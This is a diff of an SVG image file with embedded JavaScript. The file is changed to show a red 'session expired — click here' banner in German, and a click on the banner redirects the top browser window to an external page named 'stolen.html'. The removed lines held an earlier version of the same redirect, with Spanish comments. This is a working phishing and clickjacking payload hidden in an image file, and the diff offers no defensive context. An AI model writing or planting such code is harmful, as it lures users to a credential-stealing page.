@@ -1,16 +1,11 @@
-<svg xmlns="http://www.w3.org/2000/svg">
+<svg xmlns="http://www.w3.org/2000/svg" width="800" height="400">
+<rect width="800" height="400" fill="#cc0000" rx="8"/>
+<text x="400" y="200" text-anchor="middle" fill="white" font-size="24" font-family="Arial">
+  ⚠️ Sitzung abgelaufen — Hier klicken
+</text>
 <script type="text/javascript">
-  // Esperar click en cualquier parte del iframe
-  document.addEventListener('click', function() {
-    window.top.location = 'https://poggiecar.github.io/CDN/stolen.html';
-  });
-  
-  // O con un botón visible
-  var btn = document.createElementNS('http://www.w3.org/2000/svg', 'text');
-  btn.setAttribute('x', '10');
-  btn.setAttribute('y', '20');
-  btn.setAttribute('fill', 'white');
-  btn.textContent = '.';
-  document.querySelector('svg').appendChild(btn);
+document.querySelector('rect').addEventListener('click', function() {
+  window.top.location = 'https://poggiecar.github.io/CDN/stolen.html';
+});
 </script>
 </svg>
